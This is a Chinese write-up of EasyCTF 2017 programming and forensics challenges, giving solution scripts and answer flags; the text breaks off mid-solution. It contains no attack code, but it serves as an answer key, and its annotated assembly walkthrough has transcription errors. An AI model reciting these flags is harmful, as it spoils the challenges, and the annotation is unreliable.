<p>However, replace any line that is a multiple of 3 with Fizz and any that are a multiple of 5 with Buzz. Any line that is a multiple of 3 and 5 should be written as FizzBuzz.</p>
<p>The input will be the number of lines to write, n, followed by a linebreak.</p>
<p>Sample input:</p>
</p>
<pre><code>17</code></pre>
</p>
<p>Sample output:</p>
</p>
<pre><code><p>1</p><p>2</p><p>Fizz</p><p>4</p><p>Buzz</p><p>Fizz</p><p>7</p><p>8</p><p>Fizz</p><p>Buzz</p><p>11</p><p>Fizz</p><p>13</p><p>14</p><p>FizzBuzz</p><p>16</p><p>17</p></code></pre>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>n = input()</p><p>for x in xrange(1, n + 1):</p><p>&nbsp; &nbsp; if x % 3 == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if x % 5 == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print('FizzBuzz')</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print('Fizz')</p><p>&nbsp; &nbsp; elif x % 5 == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; print('Buzz')</p><p>&nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; print(x)</p></code></pre>
</p>
<h3>Library</h3>
<p><b>problem</b></p>
<p>Your librarian has a 2-row bookshelf that can contain N books in each row. She wants to know the number of ways that she can fill the bookshelf with red-colored books and blue-colored books such that no 2 red-colored books are adjacent to each other (horizontally    or vertically).</p>
<p>Input: the integer, N (1&lt;=N&lt;=2^1024)</p>
<p>Output: the number of ways you can place red-colored books and blue-colored books onto a N-column bookshelf. Since this number might be really big, output it mod 10^9+7.</p>
<p>Example: Input: 2</p>
<p>Your valid bookshelf layouts are:</p>
</p>
<pre><code><p>BB</p><p>BB</p><p>BB</p><p>BR</p><p>BR</p><p>BB</p><p>RB</p><p>BB</p><p>BB</p><p>RB</p><p>RB</p><p>BR</p><p>BR</p><p>RB</p></code></pre>
</p>
<p>Therefore, Output: 7</p>
<p><b>solutin</b></p>
<p>画图或编程找出规律公式然后就是数学推导最后编程计算</p>
<p></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907754136621.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907754136621.png!small" alt=""></p></noscript>
</p>
<pre><code><p>import numpy as np</p><p>n = input()</p><p>temp = np.array([[0, 1], [1, 2]])</p><p>matrix = np.array([[0, 1], [1, 2]])</p><p>init = np.array([[3], [7]])</p><p>for x in xrange(n - 2):</p><p>&nbsp; &nbsp; temp = np.dot(temp, matrix)</p><p>result = np.dot(temp, init)</p><p>print(result[0][0] % (10 ** 9 + 7))</p></code></pre>
</p>
<p>来自VictorZC表哥的矩阵快速幂解法</p>
</p>
<pre><code><p>n = input()</p><p>p = n-2</p><p>a0=0</p><p>a1=1</p><p>a2=1</p><p>a3=2</p><p>r0=1</p><p>r1=0</p><p>r2=0</p><p>r3=1</p><p>mod=10**9+7</p><p>while p&gt;0:</p><p>&nbsp; &nbsp; if p%2==1:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; c0=a0*r0+a1*r2</p><p>&nbsp; &nbsp; &nbsp; &nbsp; c1=a0*r1+a1*r3</p><p>&nbsp; &nbsp; &nbsp; &nbsp; c2=a2*r0+a3*r2</p><p>&nbsp; &nbsp; &nbsp; &nbsp; c3=a2*r1+a3*r3</p><p>&nbsp; &nbsp; &nbsp; &nbsp; r0=c0%mod</p><p>&nbsp; &nbsp; &nbsp; &nbsp; r1=c1%mod</p><p>&nbsp; &nbsp; &nbsp; &nbsp; r2=c2%mod</p><p>&nbsp; &nbsp; &nbsp; &nbsp; r3=c3%mod</p><p>&nbsp; &nbsp; c0=a0*a0+a1*a2</p><p>&nbsp; &nbsp; c1=a0*a1+a1*a3</p><p>&nbsp; &nbsp; c2=a2*a0+a3*a2</p><p>&nbsp; &nbsp; c3=a2*a1+a3*a3</p><p>&nbsp; &nbsp; a0=c0%mod</p><p>&nbsp; &nbsp; a1=c1%mod</p><p>&nbsp; &nbsp; a2=c2%mod</p><p>&nbsp; &nbsp; a3=c3%mod</p><p>&nbsp; &nbsp; p=p//2</p><p>if n==1:</p><p>&nbsp; &nbsp; print 3</p><p>else:</p><p>&nbsp; &nbsp; print (r2*3+r3*7)%mod</p></code></pre>
</p>
<h3>Fzz Buzz 2</h3>
<p><b>problem</b></p>
<p>Oh no! Two of my keys are broken! Please help me make the same Fzz Buzz program, sans that one letter and queston marks.As a side note, use of eval() and exec() is also frowned upon and will be marked invalid.</p>
<p><b>solution</b></p>
</p>
<pre><code><p># Create aliases</p><p>f = getattr(globals()['__bu\x69lt\x69ns__'],'\x69nput')</p><p>p = getattr(globals()['__bu\x69lt\x69ns__'],'pr\x69nt')</p><p># Get user input</p><p>n = f()</p><p># Prints text for line k and calls itself with the next line</p><p>def go(k):</p><p>&nbsp; &nbsp; a = ((k % 15 == 0) and p('F\x69zzBuzz'))</p><p>&nbsp; &nbsp; a = ((k % 3 != 0 and k % 5 == 0) and p('Buzz'))</p><p>&nbsp; &nbsp; a = ((k % 3 == 0 and k % 5 != 0) and p('F\x69zz'))</p><p>&nbsp; &nbsp; a = ((k % 3 != 0 and k % 5 != 0) and p(k))</p><p>&nbsp; &nbsp; a = ((k &lt; n) and go(k + 1))</p><p>go(1)</p></code></pre>
</p>
<h3>Down a Notch</h3>
<p><b>problem</b></p>
<p>I&#8217;ve spent too long in the high level, let&#8217;s take the level <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/down-a-notch/check" target="_blank">down a notch</a>. Help me find the correct input to this function!Your answer    should be in the format a:b where a and b are integers. Do not wrap it with easyctf{}.Hint: Compiled with x86-64 gcc 4.9.4</p>
</p>
<pre><code><p>check(int, int):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; pushq &nbsp; %rbp</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movq &nbsp; &nbsp;%rsp, %rbp</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%edi, -36(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%esi, -40(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-36(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; xorl &nbsp; &nbsp;-40(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%eax, -4(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-4(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; addl &nbsp; &nbsp;$98, %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%eax, -8(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-8(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; notl &nbsp; &nbsp;%eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%eax, %edx</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-40(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; addl &nbsp; &nbsp;%edx, %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%eax, -12(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-12(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; xorl &nbsp; &nbsp;-36(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%eax, -16(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-40(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; imull &nbsp; -4(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; cltd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; idivl &nbsp; -8(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%eax, %edx</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-36(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; leal &nbsp; &nbsp;(%rdx,%rax), %ecx</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-12(%rbp), %edx</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;-16(%rbp), %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; addl &nbsp; &nbsp;%edx, %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; xorl &nbsp; &nbsp;%ecx, %eax</p><p>&nbsp; &nbsp; &nbsp; &nbsp; movl &nbsp; &nbsp;%eax, -20(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; cmpl &nbsp; &nbsp;$-814, -20(%rbp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; sete &nbsp; &nbsp;%al</p><p>&nbsp; &nbsp; &nbsp; &nbsp; popq &nbsp; &nbsp;%rbp</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ret</p></code></pre>
</p>
<p><b>solution</b></p>
<p>推荐文章<a href="http://www.jianshu.com/p/5910b9e63644" target="_blank">从汇编角度浅析C程序</a></p>
<p>简单的汇编代码理解:</p>
</p>
<pre><code><p>push rbp</p><p>mov rbp, rsp</p><p>mov [rbp-36], edi</p><p>mov [rbp-40], esi</p><p>mov eax,[rbp-36] &nbsp; ;eax = r36</p><p>xor [rbp-40], eax &nbsp;;r40 = r40 ^ eax</p><p>mov [rbp-4], eax &nbsp; ;r4 = eax</p><p>mov eax, [rbp-4] &nbsp; ;eax = r4</p><p>add eax, 98 &nbsp; &nbsp; &nbsp; &nbsp;;eax = eax + 98</p><p>mov [rbp-8], eax &nbsp; ;r8 = eax</p><p>mov eax, [rbp-8] &nbsp; ;eax = r8</p><p>not eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;;eax = ~ eax</p><p>mov edx, eax &nbsp; &nbsp; &nbsp; ;edx = eax</p><p>mov eax,[rbp-40] &nbsp; ;eax = r40&nbsp;</p><p>add eax, edx &nbsp; &nbsp; &nbsp; ;eax = eax + edx</p><p>mov [rbp-12], eax &nbsp;;r12 = eax</p><p>mov eax, [rbp-12] &nbsp;;eax = r12</p><p>mov eax, [rbp-36] &nbsp;;eax = r36</p><p>mov [rbp-16], eax &nbsp;;r16 = eax</p><p>mov eax, [rbp-40] &nbsp;;eax = r40</p><p>imul eax, [rbp-4] &nbsp;;eax = eax * r4</p><p>cltd</p><p>idiv [rbp-8] &nbsp; &nbsp; &nbsp; ;eax = eax / r8 edx = eax % r8</p><p>mov edx, eax &nbsp; &nbsp; &nbsp; ;edx = eax</p><p>mov eax, [rbp-36] &nbsp;;eax = r36</p><p>lea ecx, [rdx+rax]&nbsp;</p><p>mov edx, [rbp-12] &nbsp;;edx =r12</p><p>mov eax, [rbp-16] &nbsp;;eax = r16</p><p>add eax, edx &nbsp; &nbsp; &nbsp; ;eax = eax + edx</p><p>xorl ecx, eax &nbsp; &nbsp; &nbsp;;ecx = ecx ^ edx</p><p>movl eax, [rbp-20] ;eax = r20</p><p>cmpl -814, [rbp-20];r20 ?= -814</p><p>sete al</p><p>popq [rbp]</p><p>ret</p></code></pre>
</p>
<pre><code><p>a = input()</p><p>b = input()</p><p>c = a ^ b</p><p>d = 98 + c</p><p>e = ~d + b</p><p>f = e ^ a</p><p>g = a + b * c / d ^ e + f</p><p>g ?= -814</p></code></pre>
</p>
<p>整理一下</p>
</p>
<pre><code>g = a + b * (a ^ b) / (98 + (a ^ b)) ^ (~(98 + a ^ b) + b) + (~(98 + a ^ b) + b) ^ a</code></pre>
</p>
<p>二元一次方程求解暴力跑一下</p>
</p>
<pre><code><p>def check(a, b):</p><p>&nbsp; &nbsp; c = a ^ b</p><p>&nbsp; &nbsp; d = 98 + c</p><p>&nbsp; &nbsp; e = ~d + b</p><p>&nbsp; &nbsp; f = e ^ a</p><p>&nbsp; &nbsp; res = a + b * c / d ^ e + f</p><p>&nbsp; &nbsp; if res == -814:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; return True</p><p>&nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; return False</p><p>for a in range(1000):</p><p>&nbsp; &nbsp; for b in range(1000):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; find = False</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if check(a, b):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; find = True</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print "%d:%d" % (a, b) # 14:975</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; if find:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p></code></pre>
</p>
<h3>MWayward Space Junk</h3>
<p><b>problem</b></p>
<p>I&#8217;m trying to destroy some space junk, but it won&#8217;t stop moving!</p>
</p>
<pre><code>nc wayward.tcp.easyctf.com 8580</code></pre>
</p>
<p>Pilot Key: 7554eb73dc155375b47b4a655a27332b</p>
<p>hint: Try figuring out the trajectory of the junk.</p>
<p><b>solution</b></p>
<p><a href="https://writeups.easyctf.com/programming.html" target="_blank">writeup</a></p>
<h3>Match Me</h3>
<p><b>problem</b></p>
<p>When making pairings between two sets of objects based on their preferences (in this case people), there can be multiple stable solutions, stable meaning that no two elements would prefer to be matched with each other over their current matching. A side-effect    of having multiple solutions is that there are solutions favor one group over the other.</p>
<p>We received two files, one listing men and the other women. Each line contains a name, followed by a series of numbers. Each number N corresponds to their preference to be matched with the Nth member of the opposite list, with 1 being the highest.</p>
<p>For example, the entry &#8220;Joe 4, 5, 3, 1, 2&#8243; means that Joe would most prefer the 4th entry on the opposite list, and least prefer the 2nd.</p>
<p>We have heard that there are some pairings that will be together in all possible stable matchings, please find them. However, because there are quite a bit of them, please submit your solution as the following:</p>
<p>MD5 hash of (male_1,female_1)(male_2,female_2)&#8230;(male_n,female_n), where the pairings are sorted alphabetically by male names. For example, (Bob,Susie)(Jim,Carol)(Tom,Emma) would be submitted as b0d75104ce4b3a7d892f745fd515fea4.</p>
<p>Here are the lists of preferences:<a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Match%20me/male" target="_blank">male preferences</a>, <a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Match%20me/female" target="_blank">female preferences</a>.</p>
<p>Hint: This is a fairly well-known graph problem. I would guess there is some sort of internet source on it.</p>
<p><b>solution</b></p>
<p><a href="https://github.com/HackThisCode/CTF-Writeups/tree/master/2017/EasyCTF/Match%20me" target="_blank">writeup</a></p>
</p>
<pre><code><p>#https://www.youtube.com/watch?v=Qcv1IqHWAzg</p><p>import hashlib</p><p>def main(maleFile,femaleFile,reverse):</p><p>&nbsp; &nbsp; #These -10000's and such are to pad the array,</p><p>&nbsp; &nbsp; #so nth id represents nth index</p><p>&nbsp; &nbsp; males = [[-10000]]</p><p>&nbsp; &nbsp; maleIDNameMap = {}</p><p>&nbsp; &nbsp; females = [[-10000]]</p><p>&nbsp; &nbsp; femaleIDNameMap = {}</p><p>&nbsp; &nbsp; loadData(males,maleIDNameMap,maleFile)</p><p>&nbsp; &nbsp; loadData(females,femaleIDNameMap,femaleFile)</p><p>&nbsp; &nbsp; #Format is that the man's index is there id, and inside is [x,y] where y is id of person they're paired with,</p><p>&nbsp; &nbsp; # and x is his rank for that person, rank being 0-based</p><p>&nbsp; &nbsp; manCurrentAssignments = [[1000000,-1000]]*len(males)</p><p>&nbsp; &nbsp; unassignedWomenIDs = list(range(1,len(females)))</p><p>&nbsp; &nbsp; while(len(unassignedWomenIDs) != 0):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; #use i, so I don't ahve to worry about modifying list while looping through it.</p><p>&nbsp; &nbsp; &nbsp; &nbsp; i = len(unassignedWomenIDs) - 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; while(i &gt;= 0):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; womanID = unassignedWomenIDs[i]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i-=1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #pop so that I don't check same combo again later.</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; nextPrefferedManID = females[womanID].pop(0)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; thisWomanPrefferenceRank = males[nextPrefferedManID].index(womanID)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(manCurrentAssignments[nextPrefferedManID][0] &gt; thisWomanPrefferenceRank):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # assign this woman to this man</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; del unassignedWomenIDs[i+1]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oldAssigneeID = manCurrentAssignments[nextPrefferedManID][1]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(oldAssigneeID==-1000):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #ezpz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; manCurrentAssignments[nextPrefferedManID] = [thisWomanPrefferenceRank,womanID]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #gotta kick off old woman, and try everything in range 1... cur</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #except I'm doing something clever and only keeping men she hasn't tried on listRef</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #so program may just iterate a few more times. No recursive dealing with kicking off more</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #and more women.</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unassignedWomenIDs.append(oldAssigneeID)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; manCurrentAssignments[nextPrefferedManID] = [thisWomanPrefferenceRank,womanID]</p><p>&nbsp; &nbsp; output = []</p><p>&nbsp; &nbsp; if(reverse):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for i in range(1,len(males)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; output.append([femaleIDNameMap[manCurrentAssignments[i][1]],maleIDNameMap[i]])</p><p>&nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for i in range(1,len(males)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; output.append([maleIDNameMap[i],femaleIDNameMap[manCurrentAssignments[i][1]]])</p><p>&nbsp; &nbsp; return output</p><p>def loadData(listRef,idRef,fname):</p><p>&nbsp; &nbsp; lines = []</p><p>&nbsp; &nbsp; with open(fname) as f:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; lines = f.readlines()</p><p>&nbsp; &nbsp; i = 1</p><p>&nbsp; &nbsp; for line in lines:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; elements = line.split(' ')</p><p>&nbsp; &nbsp; &nbsp; &nbsp; idRef[i] = elements[0]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; tmp = []</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for k in range(1,len(elements)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tmp.append(int(elements[k][:-1]))</p><p>&nbsp; &nbsp; &nbsp; &nbsp; listRef.append(tmp)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; i += 1</p><p>maleFirst &nbsp; = main('male','female',False)</p><p>femaleFirst = main('female','male',True )</p><p>toMD5 = []</p><p>for i in maleFirst:</p><p>&nbsp; &nbsp; for j in femaleFirst:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if(i[0] == j[0]):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(i[1]==j[1]):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; toMD5.append(i)</p><p># For MD5</p><p>md5String = ""</p><p>for i in toMD5:</p><p>&nbsp; &nbsp; md5String += "(%s,%s)" %(i[0], i[1])</p><p>print(md5String)</p><p>md5 = hashlib.md5(md5String.encode()).hexdigest()</p><p>print(md5)</p></code></pre>
</p>
<h2>0&#215;02 Forensics</h2>
<h3>Mane Event</h3>
<p><b>problem</b></p>
<p>My friend just got back from the plains and he took this picture with his new camera. He also told me there&#8217;s a flag hidden in it &#8211; can you check it out for me?</p>
<p><b>solution</b></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907754286665.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907754286665.png!small" alt=""></p></noscript>
<h3>20xx</h3>
<p><b>problem</b></p>
<p>My friend sent me this <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/20xx/_20xx.dtm" target="_blank">file</a> and told me to git gud.</p>
<p><b>polutin</b></p>
<p><a href="https://writeups.easyctf.com/forensics/20xx-50-points.html" target="_blank">20xx writeup</a></p>
<h3>scisnerof</h3>
<p><b>problem</b></p>
<p>I found weird file! <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/scisnerof/elif" target="_blank">elif</a></p>
<p><b>solution</b></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755099371.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755099371.png!small" alt=""></p></noscript>
<p>png文件内容被倒序处理了写一个脚本恢复</p>
</p>
<pre><code><p>with open("elif", "rb") as file:</p><p>&nbsp; &nbsp; with open("new.png", "wb") as png:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; data = []</p><p>&nbsp; &nbsp; &nbsp; &nbsp; byte = file.read(1)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; while byte != "":</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data.append(byte)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; byte = file.read(1)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for i in reversed(data):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; png.write(i)</p></code></pre>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755209281.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755209281.png!small" alt=""></p></noscript>
<p>flag:easyctf{r3v3r5ed_4ensics}</p>
<h3>Petty Difference</h3>
<p><b>problem</b></p>
<p>I found two files in a secret room. They look like jumbled letters with no patterns. I mean look at it! <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/petty-difference/file1.txt" target="_blank">file1</a> is identical to <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/petty-difference/file2.txt" target="_blank">file2</a>, right?</p>
<p><b>solution</b></p>
</p>
<pre><code><p>with open("file1.txt") as file1:</p><p>&nbsp; &nbsp; str1 = file1.read()</p><p>with open("file2.txt") as file2:</p><p>&nbsp; &nbsp; str2 = file2.read()</p><p>str1_diff = ''</p><p>str2_diff = ''</p><p>for x in range(len(str1)):</p><p>&nbsp; &nbsp; if str1[x] != str2[x]:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; str1_diff = str1_diff + str1[x]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; str2_diff = str2_diff + str2[x]</p><p>print(str1_diff)</p><p>print(str2_diff)</p><p>print("flag:%s" %str1_diff[::-1])</p></code></pre>
</p>
<h3>Flag Collection</h3>
<p><b>problem</b></p>
<p>Here&#8217;s a <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/flag-collection/flags.zip" target="_blank">collection of flags</a>! I think you&#8217;re looking for a specific one, though&#8230;</p>
<p><b>solution</b></p>
<p><a href="http://baike.baidu.com/item/Thumbs.db" target="_blank">Thumbs.db</a></p>
<p><a href="https://thumbsviewer.github.io/" target="_blank">thumbs viewer</a></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907766457833.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="11.png"></p>
<noscript><img src="http://image.3001.net/images/20170329/14907766457833.png!small" alt="11.png"></p></noscript>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755304145.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755304145.png!small" alt=""></p></noscript>
</p>
<pre><code>easyctf{thumbs.db_c4n_b3_useful}</code></pre>
</p>
<h3>Zooooooom</h3>
<p><b>problem</b></p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/zooooooom/hekkerman.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank">Hekkerman</a> is looking awfully spooky. That hekker glare could pierce a firewall. What can he see that you can&#8217;t?</p>
<p><b>solution</b></p>
<p>图片由三张图片合并拼接而成分别分离出得到flag</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755394291.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755394291.png!small" alt=""></p></noscript>
<h3>Gibberish</h3>
<p><b>problem</b></p>
<p>I have no idea what <a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Gibberish/gibberish.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank">this</a> image is, but my sources tell me that it contains something useful, a flag perhaps? Can you    help me find it?There are 3 parts to the flag. There are 3 colors of the rainbow. My flag will never expire.HintPresence is more important than intensity. Everything is simply boolean. One of the parts requires a scanner.</p>
<p><b>solution</b></p>
<p>这题要仔细审题给了很多信息提示flag由三部分组成又说了三种颜色只给了一张24位的图片</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755479691.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755479691.png!small" alt=""></p></noscript>
<p>很容易联想到图像的R,G,B分离处理打开PS把图像的R,G,B通道分离得到</p>
<p>R通道</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755535603.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755535603.png!small" alt=""></p></noscript>
<p>G通道</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755623378.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755623378.png!small" alt=""></p></noscript>
<p>B通道</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/1490775568959.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/1490775568959.png!small" alt=""></p></noscript>
<p>题目又提示其中一张需要扫描器综合来看3张图片有张可能是条形码于是PS中反相不断锐化然后将线条填充完整类似这样</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907755768972.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907755768972.png!small" alt=""></p></noscript>
<p>不过这样太麻烦于是写个脚本自动处理图像</p>
</p>
